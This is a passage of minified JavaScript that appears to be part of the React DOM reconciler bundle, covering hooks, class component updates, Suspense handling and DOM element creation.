s=en();$n(n,t,i,s),Wv(n,e,i)}}function A_(t,e,n){var i=as(t),s={lane:i,action:n,hasEagerState:!1,eagerState:null,next:null};if(Hv(t))Gv(e,s);else{var r=t.alternate;if(t.lanes===0&&(r===null||r.lanes===0)&&(r=e.lastRenderedReducer,r!==null))try{var a=e.lastRenderedState,o=r(a,n);if(s.hasEagerState=!0,s.eagerState=o,Kn(o,a)){var l=e.interleaved;l===null?(s.next=s,Vh(e)):(s.next=l.next,l.next=s),e.interleaved=s;return}}catch{}finally{}n=wv(t,e,s,i),n!==null&&(s=en(),$n(n,t,i,s),Wv(n,e,i))}}function Hv(t){var e=t.alternate;return t===gt||e!==null&&e===gt}function Gv(t,e){ba=Ll=!0;var n=t.pending;n===null?e.next=e:(e.next=n.next,n.next=e),t.pending=e}function Wv(t,e,n){if(n&4194240){var i=e.lanes;i&=t.pendingLanes,n|=i,e.lanes=n,Ah(t,n)}}var Pl={readContext:Dn,useCallback:Ht,useContext:Ht,useEffect:Ht,useImperativeHandle:Ht,useInsertionEffect:Ht,useLayoutEffect:Ht,useMemo:Ht,useReducer:Ht,useRef:Ht,useState:Ht,useDebugValue:Ht,useDeferredValue:Ht,useTransition:Ht,useMutableSource:Ht,useSyncExternalStore:Ht,useId:Ht,unstable_isNewReconciler:!1},C_={readContext:Dn,useCallback:function(t,e){return ti().memoizedState=[t,e===void 0?null:e],t},useContext:Dn,useEffect:Mf,useImperativeHandle:function(t,e,n){return n=n!=null?n.concat([t]):null,il(4194308,4,Uv.bind(null,e,t),n)},useLayoutEffect:function(t,e){return il(4194308,4,t,e)},useInsertionEffect:function(t,e){return il(4,2,t,e)},useMemo:function(t,e){var n=ti();return e=e===void 0?null:e,t=t(),n.memoizedState=[t,e],t},useReducer:function(t,e,n){var i=ti();return e=n!==void 0?n(e):e,i.memoizedState=i.baseState=e,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:t,lastRenderedState:e},i.queue=t,t=t.dispatch=T_.bind(null,gt,t),[i.memoizedState,t]},useRef:function(t){var e=ti();return t={current:t},e.memoizedState=t},useState:wf,useDebugValue:Kh,useDeferredValue:function(t){return ti().memoizedState=t},useTransition:function(){var t=wf(!1),e=t[0];return t=E_.bind(null,t[1]),ti().memoizedState=t,[e,t]},useMutableSource:function(){},useSyncExternalStore:function(t,e,n){var i=gt,s=ti();if(ft){if(n===void 0)throw Error(se(407));n=n()}else{if(n=e(),Ut===null)throw Error(se(349));Fs&30||Cv(i,e,n)}s.memoizedState=n;var r={value:n,getSnapshot:e};return s.queue=r,Mf(kv.bind(null,i,r,t),[t]),i.flags|=2048,za(9,Rv.bind(null,i,r,n,e),void 0,null),n},useId:function(){var t=ti(),e=Ut.identifierPrefix;if(ft){var n=Ei,i=Mi;n=(i&~(1<<32-Yn(i)-1)).toString(32)+n,e=":"+e+"R"+n,n=Fa++,0<n&&(e+="H"+n.toString(32)),e+=":"}else n=M_++,e=":"+e+"r"+n.toString(32)+":";return t.memoizedState=e},unstable_isNewReconciler:!1},R_={readContext:Dn,useCallback:Fv,useContext:Dn,useEffect:$h,useImperativeHandle:Ov,useInsertionEffect:Iv,useLayoutEffect:Dv,useMemo:Bv,useReducer:Nc,useRef:Nv,useState:function(){return Nc(Ba)},useDebugValue:Kh,useDeferredValue:function(t){var e=Un();return zv(e,Rt.memoizedState,t)},useTransition:function(){var t=Nc(Ba)[0],e=Un().memoizedState;return[t,e]},useMutableSource:Tv,useSyncExternalStore:Av,useId:Vv,unstable_isNewReconciler:!1},k_={readContext:Dn,useCallback:Fv,useContext:Dn,useEffect:$h,useImperativeHandle:Ov,useInsertionEffect:Iv,useLayoutEffect:Dv,useMemo:Bv,useReducer:Ic,useRef:Nv,useState:function(){return Ic(Ba)},useDebugValue:Kh,useDeferredValue:function(t){var e=Un();return Rt===null?e.memoizedState=t:zv(e,Rt.memoizedState,t)},useTransition:function(){var t=Ic(Ba)[0],e=Un().memoizedState;return[t,e]},useMutableSource:Tv,useSyncExternalStore:Av,useId:Vv,unstable_isNewReconciler:!1};function Vn(t,e){if(t&&t.defaultProps){e=vt({},e),t=t.defaultProps;for(var n in t)e[n]===void 0&&(e[n]=t[n]);return e}return e}function td(t,e,n,i){e=t.memoizedState,n=n(i,e),n=n==null?e:vt({},e,n),t.memoizedState=n,t.lanes===0&&(t.updateQueue.baseState=n)}var Zl={isMounted:function(t){return(t=t._reactInternals)?Gs(t)===t:!1},enqueueSetState:function(t,e,n){t=t._reactInternals;var i=en(),s=as(t),r=Ai(i,s);r.payload=e,n!=null&&(r.callback=n),e=ss(t,r,s),e!==null&&($n(e,t,s,i),tl(e,t,s))},enqueueReplaceState:function(t,e,n){t=t._reactInternals;var i=en(),s=as(t),r=Ai(i,s);r.tag=1,r.payload=e,n!=null&&(r.callback=n),e=ss(t,r,s),e!==null&&($n(e,t,s,i),tl(e,t,s))},enqueueForceUpdate:function(t,e){t=t._reactInternals;var n=en(),i=as(t),s=Ai(n,i);s.tag=2,e!=null&&(s.callback=e),e=ss(t,s,i),e!==null&&($n(e,t,i,n),tl(e,t,i))}};function Ef(t,e,n,i,s,r,a){return t=t.stateNode,typeof t.shouldComponentUpdate=="function"?t.shouldComponentUpdate(i,r,a):e.prototype&&e.prototype.isPureReactComponent?!Pa(n,i)||!Pa(s,r):!0}function jv(t,e,n){var i=!1,s=us,r=e.contextType;return typeof r=="object"&&r!==null?r=Dn(r):(s=dn(e)?Us:Kt.current,i=e.contextTypes,r=(i=i!=null)?Rr(t,s):us),e=new e(n,r),t.memoizedState=e.state!==null&&e.state!==void 0?e.state:null,e.updater=Zl,t.stateNode=e,e._reactInternals=t,i&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=s,t.__reactInternalMemoizedMaskedChildContext=r),e}function Tf(t,e,n,i){t=e.state,typeof e.componentWillReceiveProps=="function"&&e.componentWillReceiveProps(n,i),typeof e.UNSAFE_componentWillReceiveProps=="function"&&e.UNSAFE_componentWillReceiveProps(n,i),e.state!==t&&Zl.enqueueReplaceState(e,e.state,null)}function nd(t,e,n,i){var s=t.stateNode;s.props=n,s.state=t.memoizedState,s.refs={},Hh(t);var r=e.contextType;typeof r=="object"&&r!==null?s.context=Dn(r):(r=dn(e)?Us:Kt.current,s.context=Rr(t,r)),s.state=t.memoizedState,r=e.getDerivedStateFromProps,typeof r=="function"&&(td(t,e,r,n),s.state=t.memoizedState),typeof e.getDerivedStateFromProps=="function"||typeof s.getSnapshotBeforeUpdate=="function"||typeof s.UNSAFE_componentWillMount!="function"&&typeof s.componentWillMount!="function"||(e=s.state,typeof s.componentWillMount=="function"&&s.componentWillMount(),typeof s.UNSAFE_componentWillMount=="function"&&s.UNSAFE_componentWillMount(),e!==s.state&&Zl.enqueueReplaceState(s,s.state,null),Rl(t,n,s,i),s.state=t.memoizedState),typeof s.componentDidMount=="function"&&(t.flags|=4194308)}function Nr(t,e){try{var n="",i=e;do n+=sx(i),i=i.return;while(i);var s=n}catch(r){s=`
Error generating stack: `+r.message+`
`+r.stack}return{value:t,source:e,stack:s,digest:null}}function Dc(t,e,n){return{value:t,source:null,stack:n??null,digest:e??null}}function id(t,e){try{console.error(e.value)}catch(n){setTimeout(function(){throw n})}}var L_=typeof WeakMap=="function"?WeakMap:Map;function Xv(t,e,n){n=Ai(-1,n),n.tag=3,n.payload={element:null};var i=e.value;return n.callback=function(){Il||(Il=!0,pd=i),id(t,e)},n}function qv(t,e,n){n=Ai(-1,n),n.tag=3;var i=t.type.getDerivedStateFromError;if(typeof i=="function"){var s=e.value;n.payload=function(){return i(s)},n.callback=function(){id(t,e)}}var r=t.stateNode;return r!==null&&typeof r.componentDidCatch=="function"&&(n.callback=function(){id(t,e),typeof i!="function"&&(rs===null?rs=new Set([this]):rs.add(this));var a=e.stack;this.componentDidCatch(e.value,{componentStack:a!==null?a:""})}),n}function Af(t,e,n){var i=t.pingCache;if(i===null){i=t.pingCache=new L_;var s=new Set;i.set(e,s)}else s=i.get(e),s===void 0&&(s=new Set,i.set(e,s));s.has(n)||(s.add(n),t=j_.bind(null,t,e,n),e.then(t,t))}function Cf(t){do{var e;if((e=t.tag===13)&&(e=t.memoizedState,e=e!==null?e.dehydrated!==null:!0),e)return t;t=t.return}while(t!==null);return null}function Rf(t,e,n,i,s){return t.mode&1?(t.flags|=65536,t.lanes=s,t):(t===e?t.flags|=65536:(t.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(e=Ai(-1,1),e.tag=2,ss(n,e,1))),n.lanes|=1),t)}var P_=Ui.ReactCurrentOwner,cn=!1;function Qt(t,e,n,i){e.child=t===null?Sv(e,null,n,i):Lr(e,t.child,n,i)}function kf(t,e,n,i,s){n=n.render;var r=e.ref;return Mr(e,s),i=qh(t,e,n,i,r,s),n=Yh(),t!==null&&!cn?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~s,Ni(t,e,s)):(ft&&n&&Dh(e),e.flags|=1,Qt(t,e,i,s),e.child)}function Lf(t,e,n,i,s){if(t===null){var r=n.type;return typeof r=="function"&&!sp(r)&&r.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(e.tag=15,e.type=r,Yv(t,e,r,i,s)):(t=ol(n.type,null,i,e,e.mode,s),t.ref=e.ref,t.return=e,e.child=t)}if(r=t.child,!(t.lanes&s)){var a=r.memoizedProps;if(n=n.compare,n=n!==null?n:Pa,n(a,i)&&t.ref===e.ref)return Ni(t,e,s)}return e.flags|=1,t=os(r,i),t.ref=e.ref,t.return=e,e.child=t}function Yv(t,e,n,i,s){if(t!==null){var r=t.memoizedProps;if(Pa(r,i)&&t.ref===e.ref)if(cn=!1,e.pendingProps=i=r,(t.lanes&s)!==0)t.flags&131072&&(cn=!0);else return e.lanes=t.lanes,Ni(t,e,s)}return sd(t,e,n,i,s)}function $v(t,e,n){var i=e.pendingProps,s=i.children,r=t!==null?t.memoizedState:null;if(i.mode==="hidden")if(!(e.mode&1))e.memoizedState={baseLanes:0,cachePool:null,transitions:null},dt(yr,yn),yn|=n;else{if(!(n&1073741824))return t=r!==null?r.baseLanes|n:n,e.lanes=e.childLanes=1073741824,e.memoizedState={baseLanes:t,cachePool:null,transitions:null},e.updateQueue=null,dt(yr,yn),yn|=t,null;e.memoizedState={baseLanes:0,cachePool:null,transitions:null},i=r!==null?r.baseLanes:n,dt(yr,yn),yn|=i}else r!==null?(i=r.baseLanes|n,e.memoizedState=null):i=n,dt(yr,yn),yn|=i;return Qt(t,e,s,n),e.child}function Kv(t,e){var n=e.ref;(t===null&&n!==null||t!==null&&t.ref!==n)&&(e.flags|=512,e.flags|=2097152)}function sd(t,e,n,i,s){var r=dn(n)?Us:Kt.current;return r=Rr(e,r),Mr(e,s),n=qh(t,e,n,i,r,s),i=Yh(),t!==null&&!cn?(e.updateQueue=t.updateQueue,e.flags&=-2053,t.lanes&=~s,Ni(t,e,s)):(ft&&i&&Dh(e),e.flags|=1,Qt(t,e,n,s),e.child)}function Pf(t,e,n,i,s){if(dn(n)){var r=!0;Ml(e)}else r=!1;if(Mr(e,s),e.stateNode===null)sl(t,e),jv(e,n,i),nd(e,n,i,s),i=!0;else if(t===null){var a=e.stateNode,o=e.memoizedProps;a.props=o;var l=a.context,c=n.contextType;typeof c=="object"&&c!==null?c=Dn(c):(c=dn(n)?Us:Kt.current,c=Rr(e,c));var h=n.getDerivedStateFromProps,d=typeof h=="function"||typeof a.getSnapshotBeforeUpdate=="function";d||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(o!==i||l!==c)&&Tf(e,a,i,c),Xi=!1;var p=e.memoizedState;a.state=p,Rl(e,i,a,s),l=e.memoizedState,o!==i||p!==l||un.current||Xi?(typeof h=="function"&&(td(e,n,h,i),l=e.memoizedState),(o=Xi||Ef(e,n,o,i,p,l,c))?(d||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount()),typeof a.componentDidMount=="function"&&(e.flags|=4194308)):(typeof a.componentDidMount=="function"&&(e.flags|=4194308),e.memoizedProps=i,e.memoizedState=l),a.props=i,a.state=l,a.context=c,i=o):(typeof a.componentDidMount=="function"&&(e.flags|=4194308),i=!1)}else{a=e.stateNode,Mv(t,e),o=e.memoizedProps,c=e.type===e.elementType?o:Vn(e.type,o),a.props=c,d=e.pendingProps,p=a.context,l=n.contextType,typeof l=="object"&&l!==null?l=Dn(l):(l=dn(n)?Us:Kt.current,l=Rr(e,l));var f=n.getDerivedStateFromProps;(h=typeof f=="function"||typeof a.getSnapshotBeforeUpdate=="function")||typeof a.UNSAFE_componentWillReceiveProps!="function"&&typeof a.componentWillReceiveProps!="function"||(o!==d||p!==l)&&Tf(e,a,i,l),Xi=!1,p=e.memoizedState,a.state=p,Rl(e,i,a,s);var y=e.memoizedState;o!==d||p!==y||un.current||Xi?(typeof f=="function"&&(td(e,n,f,i),y=e.memoizedState),(c=Xi||Ef(e,n,c,i,p,y,l)||!1)?(h||typeof a.UNSAFE_componentWillUpdate!="function"&&typeof a.componentWillUpdate!="function"||(typeof a.componentWillUpdate=="function"&&a.componentWillUpdate(i,y,l),typeof a.UNSAFE_componentWillUpdate=="function"&&a.UNSAFE_componentWillUpdate(i,y,l)),typeof a.componentDidUpdate=="function"&&(e.flags|=4),typeof a.getSnapshotBeforeUpdate=="function"&&(e.flags|=1024)):(typeof a.componentDidUpdate!="function"||o===t.memoizedProps&&p===t.memoizedState||(e.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||o===t.memoizedProps&&p===t.memoizedState||(e.flags|=1024),e.memoizedProps=i,e.memoizedState=y),a.props=i,a.state=y,a.context=l,i=c):(typeof a.componentDidUpdate!="function"||o===t.memoizedProps&&p===t.memoizedState||(e.flags|=4),typeof a.getSnapshotBeforeUpdate!="function"||o===t.memoizedProps&&p===t.memoizedState||(e.flags|=1024),i=!1)}return rd(t,e,n,i,r,s)}function rd(t,e,n,i,s,r){Kv(t,e);var a=(e.flags&128)!==0;if(!i&&!a)return s&&vf(e,n,!1),Ni(t,e,r);i=e.stateNode,P_.current=e;var o=a&&typeof n.getDerivedStateFromError!="function"?null:i.render();return e.flags|=1,t!==null&&a?(e.child=Lr(e,t.child,null,r),e.child=Lr(e,null,o,r)):Qt(t,e,o,r),e.memoizedState=i.state,s&&vf(e,n,!0),e.child}function Zv(t){var e=t.stateNode;e.pendingContext?gf(t,e.pendingContext,e.pendingContext!==e.context):e.context&&gf(t,e.context,!1),Gh(t,e.containerInfo)}function Nf(t,e,n,i,s){return kr(),Oh(s),e.flags|=256,Qt(t,e,n,i),e.child}var ad={dehydrated:null,treeContext:null,retryLane:0};function od(t){return{baseLanes:t,cachePool:null,transitions:null}}function Jv(t,e,n){var i=e.pendingProps,s=mt.current,r=!1,a=(e.flags&128)!==0,o;if((o=a)||(o=t!==null&&t.memoizedState===null?!1:(s&2)!==0),o?(r=!0,e.flags&=-129):(t===null||t.memoizedState!==null)&&(s|=1),dt(mt,s&1),t===null)return Qu(e),t=e.memoizedState,t!==null&&(t=t.dehydrated,t!==null)?(e.mode&1?t.data==="$!"?e.lanes=8:e.lanes=1073741824:e.lanes=1,null):(a=i.children,t=i.fallback,r?(i=e.mode,r=e.child,a={mode:"hidden",children:a},!(i&1)&&r!==null?(r.childLanes=0,r.pendingProps=a):r=ec(a,i,0,null),t=Ds(t,i,n,null),r.return=e,t.return=e,r.sibling=t,e.child=r,e.child.memoizedState=od(n),e.memoizedState=ad,t):Zh(e,a));if(s=t.memoizedState,s!==null&&(o=s.dehydrated,o!==null))return N_(t,e,a,i,o,s,n);if(r){r=i.fallback,a=e.mode,s=t.child,o=s.sibling;var l={mode:"hidden",children:i.children};return!(a&1)&&e.child!==s?(i=e.child,i.childLanes=0,i.pendingProps=l,e.deletions=null):(i=os(s,l),i.subtreeFlags=s.subtreeFlags&14680064),o!==null?r=os(o,r):(r=Ds(r,a,n,null),r.flags|=2),r.return=e,i.return=e,i.sibling=r,e.child=i,i=r,r=e.child,a=t.child.memoizedState,a=a===null?od(n):{baseLanes:a.baseLanes|n,cachePool:null,transitions:a.transitions},r.memoizedState=a,r.childLanes=t.childLanes&~n,e.memoizedState=ad,i}return r=t.child,t=r.sibling,i=os(r,{mode:"visible",children:i.children}),!(e.mode&1)&&(i.lanes=n),i.return=e,i.sibling=null,t!==null&&(n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)),e.child=i,e.memoizedState=null,i}function Zh(t,e){return e=ec({mode:"visible",children:e},t.mode,0,null),e.return=t,t.child=e}function Mo(t,e,n,i){return i!==null&&Oh(i),Lr(e,t.child,null,n),t=Zh(e,e.pendingProps.children),t.flags|=2,e.memoizedState=null,t}function N_(t,e,n,i,s,r,a){if(n)return e.flags&256?(e.flags&=-257,i=Dc(Error(se(422))),Mo(t,e,a,i)):e.memoizedState!==null?(e.child=t.child,e.flags|=128,null):(r=i.fallback,s=e.mode,i=ec({mode:"visible",children:i.children},s,0,null),r=Ds(r,s,a,null),r.flags|=2,i.return=e,r.return=e,i.sibling=r,e.child=i,e.mode&1&&Lr(e,t.child,null,a),e.child.memoizedState=od(a),e.memoizedState=ad,r);if(!(e.mode&1))return Mo(t,e,a,null);if(s.data==="$!"){if(i=s.nextSibling&&s.nextSibling.dataset,i)var o=i.dgst;return i=o,r=Error(se(419)),i=Dc(r,i,void 0),Mo(t,e,a,i)}if(o=(a&t.childLanes)!==0,cn||o){if(i=Ut,i!==null){switch(a&-a){case 4:s=2;break;case 16:s=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:s=32;break;case 536870912:s=268435456;break;default:s=0}s=s&(i.suspendedLanes|a)?0:s,s!==0&&s!==r.retryLane&&(r.retryLane=s,Pi(t,s),$n(i,t,s,-1))}return ip(),i=Dc(Error(se(421))),Mo(t,e,a,i)}return s.data==="$?"?(e.flags|=128,e.child=t.child,e=X_.bind(null,t),s._reactRetry=e,null):(t=r.treeContext,bn=is(s.nextSibling),Sn=e,ft=!0,Wn=null,t!==null&&(kn[Ln++]=Mi,kn[Ln++]=Ei,kn[Ln++]=Os,Mi=t.id,Ei=t.overflow,Os=e),e=Zh(e,i.children),e.flags|=4096,e)}function If(t,e,n){t.lanes|=e;var i=t.alternate;i!==null&&(i.lanes|=e),ed(t.return,e,n)}function Uc(t,e,n,i,s){var r=t.memoizedState;r===null?t.memoizedState={isBackwards:e,rendering:null,renderingStartTime:0,last:i,tail:n,tailMode:s}:(r.isBackwards=e,r.rendering=null,r.renderingStartTime=0,r.last=i,r.tail=n,r.tailMode=s)}function Qv(t,e,n){var i=e.pendingProps,s=i.revealOrder,r=i.tail;if(Qt(t,e,i.children,n),i=mt.current,i&2)i=i&1|2,e.flags|=128;else{if(t!==null&&t.flags&128)e:for(t=e.child;t!==null;){if(t.tag===13)t.memoizedState!==null&&If(t,n,e);else if(t.tag===19)If(t,n,e);else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;t=t.return}t.sibling.return=t.return,t=t.sibling}i&=1}if(dt(mt,i),!(e.mode&1))e.memoizedState=null;else switch(s){case"forwards":for(n=e.child,s=null;n!==null;)t=n.alternate,t!==null&&kl(t)===null&&(s=n),n=n.sibling;n=s,n===null?(s=e.child,e.child=null):(s=n.sibling,n.sibling=null),Uc(e,!1,s,n,r);break;case"backwards":for(n=null,s=e.child,e.child=null;s!==null;){if(t=s.alternate,t!==null&&kl(t)===null){e.child=s;break}t=s.sibling,s.sibling=n,n=s,s=t}Uc(e,!0,n,null,r);break;case"together":Uc(e,!1,null,null,void 0);break;default:e.memoizedState=null}return e.child}function sl(t,e){!(e.mode&1)&&t!==null&&(t.alternate=null,e.alternate=null,e.flags|=2)}function Ni(t,e,n){if(t!==null&&(e.dependencies=t.dependencies),Bs|=e.lanes,!(n&e.childLanes))return null;if(t!==null&&e.child!==t.child)throw Error(se(153));if(e.child!==null){for(t=e.child,n=os(t,t.pendingProps),e.child=n,n.return=e;t.sibling!==null;)t=t.sibling,n=n.sibling=os(t,t.pendingProps),n.return=e;n.sibling=null}return e.child}function I_(t,e,n){switch(e.tag){case 3:Zv(e),kr();break;case 5:Ev(e);break;case 1:dn(e.type)&&Ml(e);break;case 4:Gh(e,e.stateNode.containerInfo);break;case 10:var i=e.type._context,s=e.memoizedProps.value;dt(Al,i._currentValue),i._currentValue=s;break;case 13:if(i=e.memoizedState,i!==null)return i.dehydrated!==null?(dt(mt,mt.current&1),e.flags|=128,null):n&e.child.childLanes?Jv(t,e,n):(dt(mt,mt.current&1),t=Ni(t,e,n),t!==null?t.sibling:null);dt(mt,mt.current&1);break;case 19:if(i=(n&e.childLanes)!==0,t.flags&128){if(i)return Qv(t,e,n);e.flags|=128}if(s=e.memoizedState,s!==null&&(s.rendering=null,s.tail=null,s.lastEffect=null),dt(mt,mt.current),i)break;return null;case 22:case 23:return e.lanes=0,$v(t,e,n)}return Ni(t,e,n)}var e0,ld,t0,n0;e0=function(t,e){for(var n=e.child;n!==null;){if(n.tag===5||n.tag===6)t.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};ld=function(){};t0=function(t,e,n,i){var s=t.memoizedProps;if(s!==i){t=e.stateNode,Ls(oi.current);var r=null;switch(n){case"input":s=ku(t,s),i=ku(t,i),r=[];break;case"select":s=vt({},s,{value:void 0}),i=vt({},i,{value:void 0}),r=[];break;case"textarea":s=Nu(t,s),i=Nu(t,i),r=[];break;default:typeof s.onClick!="function"&&typeof i.onClick=="function"&&(t.onclick=Sl)}Du(n,i);var a;n=null;for(c in s)if(!i.hasOwnProperty(c)&&s.hasOwnProperty(c)&&s[c]!=null)if(c==="style"){var o=s[c];for(a in o)o.hasOwnProperty(a)&&(n||(n={}),n[a]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(Ea.hasOwnProperty(c)?r||(r=[]):(r=r||[]).push(c,null));for(c in i){var l=i[c];if(o=s!=null?s[c]:void 0,i.hasOwnProperty(c)&&l!==o&&(l!=null||o!=null))if(c==="style")if(o){for(a in o)!o.hasOwnProperty(a)||l&&l.hasOwnProperty(a)||(n||(n={}),n[a]="");for(a in l)l.hasOwnProperty(a)&&o[a]!==l[a]&&(n||(n={}),n[a]=l[a])}else n||(r||(r=[]),r.push(c,n)),n=l;else c==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,o=o?o.__html:void 0,l!=null&&o!==l&&(r=r||[]).push(c,l)):c==="children"?typeof l!="string"&&typeof l!="number"||(r=r||[]).push(c,""+l):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(Ea.hasOwnProperty(c)?(l!=null&&c==="onScroll"&&ht("scroll",t),r||o===l||(r=[])):(r=r||[]).push(c,l))}n&&(r=r||[]).push("style",n);var c=r;(e.updateQueue=c)&&(e.flags|=4)}};n0=function(t,e,n,i){n!==i&&(e.flags|=4)};function Qr(t,e){if(!ft)switch(t.tailMode){case"hidden":e=t.tail;for(var n=null;e!==null;)e.alternate!==null&&(n=e),e=e.sibling;n===null?t.tail=null:n.sibling=null;break;case"collapsed":n=t.tail;for(var i=null;n!==null;)n.alternate!==null&&(i=n),n=n.sibling;i===null?e||t.tail===null?t.tail=null:t.tail.sibling=null:i.sibling=null}}function Gt(t){var e=t.alternate!==null&&t.alternate.child===t.child,n=0,i=0;if(e)for(var s=t.child;s!==null;)n|=s.lanes|s.childLanes,i|=s.subtreeFlags&14680064,i|=s.flags&14680064,s.return=t,s=s.sibling;else for(s=t.child;s!==null;)n|=s.lanes|s.childLanes,i|=s.subtreeFlags,i|=s.flags,s.return=t,s=s.sibling;return t.subtreeFlags|=i,t.childLanes=n,e}function D_(t,e,n){var i=e.pendingProps;switch(Uh(e),e.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Gt(e),null;case 1:return dn(e.type)&&wl(),Gt(e),null;case 3:return i=e.stateNode,Pr(),pt(un),pt(Kt),jh(),i.pendingContext&&(i.context=i.pendingContext,i.pendingContext=null),(t===null||t.child===null)&&(So(e)?e.flags|=4:t===null||t.memoizedState.isDehydrated&&!(e.flags&256)||(e.flags|=1024,Wn!==null&&(gd(Wn),Wn=null))),ld(t,e),Gt(e),null;case 5:Wh(e);var s=Ls(Oa.current);if(n=e.type,t!==null&&e.stateNode!=null)t0(t,e,n,i,s),t.ref!==e.ref&&(e.flags|=512,e.flags|=2097152);else{if(!i){if(e.stateNode===null)throw Error(se(166));return Gt(e),null}if(t=Ls(oi.current),So(e)){i=e.stateNode,n=e.type;var r=e.memoizedProps;switch(i[ii]=e,i[Da]=r,t=(e.mode&1)!==0,n){case"dialog":ht("cancel",i),ht("close",i);break;case"iframe":case"object":case"embed":ht("load",i);break;case"video":case"audio":for(s=0;s<ha.length;s++)ht(ha[s],i);break;case"source":ht("error",i);break;case"img":case"image":case"link":ht("error",i),ht("load",i);break;case"details":ht("toggle",i);break;case"input":Hp(i,r),ht("invalid",i);break;case"select":i._wrapperState={wasMultiple:!!r.multiple},ht("invalid",i);break;case"textarea":Wp(i,r),ht("invalid",i)}Du(n,r),s=null;for(var a in r)if(r.hasOwnProperty(a)){var o=r[a];a==="children"?typeof o=="string"?i.textContent!==o&&(r.suppressHydrationWarning!==!0&&bo(i.textContent,o,t),s=["children",o]):typeof o=="number"&&i.textContent!==""+o&&(r.suppressHydrationWarning!==!0&&bo(i.textContent,o,t),s=["children",""+o]):Ea.hasOwnProperty(a)&&o!=null&&a==="onScroll"&&ht("scroll",i)}switch(n){case"input":po(i),Gp(i,r,!0);break;case"textarea":po(i),jp(i);break;case"select":case"option":break;default:typeof r.onClick=="function"&&(i.onclick=Sl)}i=s,e.updateQueue=i,i!==null&&(e.flags|=4)}else{a=s.nodeType===9?s:s.ownerDocument,t==="http://www.w3.org/1999/xhtml"&&(t=kg(n)),t==="http://www.w3.org/1999/xhtml"?n==="script"?(t=a.createElement("div"),t.innerHTML="<script><\/script>",t=t.removeChild(t.firstChild)):typeof i.is=="string"?t=a.createElement(n,{is:i.is}):(t=a.createElement(n),n==="select"&&(a=t,i.multiple?a.multiple=!0:i.size&&(a.size=i.size))):t=a.createElementNS(t,n),t[ii]=e,t[Da]=i,e0(t,e,!1,!1),e.stateNode=t;e:{switch(a=Uu(n,i),n){case"dialog":ht("cancel",t),ht("close",t),s=i;break;case"iframe":case"object":case"embed":ht("load",t),s=i;break;case"video":case"audio":for(s=0;s<ha.length;s++)ht(ha[s],t);s=i;break;case"source":ht("error",t),s=i;break;case"img":case"image":case"link":ht("error",t),ht("load",t),s=i;break;case"details":ht("toggle",t),s=i;break;case"input":Hp(t,i),s=ku(t,i),ht("invalid",t);break;case"option":s=i;break;case"select":t._wrapperState={wasMultiple:!!i.multiple},s=vt({},i,{value:void 0}),ht("invalid",t);break;case"textarea":Wp(t,i),s=Nu(t,i),ht("invalid",t);break;default:s=i}Du(n,s),o=s;for(r in o)if(o.hasOwnProperty(r)){var l=o[r];r==="style"?Ng(t,l):r==="dangerouslySetInnerHTML"?(l=l?l.__html:void 0,l!=null&&Lg(t,l)):r==="children"?typeof l=="string"?(n!=="textarea"||l!=="")&&Ta(t,l):typeof l=="number"&&Ta(t,""+l):r!=="suppressContentEditableWarning"&&r!=="suppressHydrationWarning"&&r!=="autoFocus"&&(Ea.hasOwnProperty(r)?l!=null&&r==="onScroll"&&ht("scroll",t):l!=null&&bh(t,r,l,a))}switch(n){case"input":po(t),Gp(t,i,!1);break;case"textarea":po(t),jp(t);break;case"option":i.value!=null&&t.setAttribute("value",""+cs(i.value));break;case"select":t.multiple=!!i.multiple,r=i.value,r!=null?_r(t,!!i.multiple,r,!1):i.defaultValue!=null&&_r(t,!!i.multiple,i.defaultValue,!0);break;default:typeof s.onClick=="function"&&(t.onclick=Sl)}switch(n){case"button":case"input":case"select":case"textarea":i=!!i.autoFocus;break e;case"img":i=!0;break e;default:i=!1}}i&&(e.flags|=4)}e.ref!==null&&(e.flags|=512,e.flags|=2097152)}return Gt(e),null;case 6:if(t&&e.stateNode!=null)n0(t,e,t.memoizedProps,i);else{if(typeof i!="string"&&e.stateNode===null)throw Error(se(166));if(n=Ls(Oa.current),Ls(oi.current),So(e)){if(i=e.stateNode,n=e.memoizedProps,i[ii]=e,(r=i.nodeValue!==n)&&(t=Sn,t!==null))switch(t.tag){case 3:bo(i.nodeValue,n,(t.mode&1)!==0);break;case 5:t.memoizedProps.suppressHydrationWarning!==!0&&bo(i.nodeValue,n,(t.mode&1)!==0)}r&&(e.flags|=4)}else i=(n.nodeType===9?n:n.ownerDocument).createTextNode(i),i[ii]=e,e.stateNode=i}return Gt(e),null;case 13:if(pt(mt),i=e.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(ft&&bn!==null&&e.mode&1&&!(e.flags&128))_v(),kr(),e.flags|=98560,r=!1;else if(r=So(e),i!==null&&i.dehydrated!==null){if(t===null){if(!r)throw Error(se(318));if(r=e.memoizedState,r=r!==null?r.dehydrated:null,!r)throw Error(se(317));r[ii]=e}else 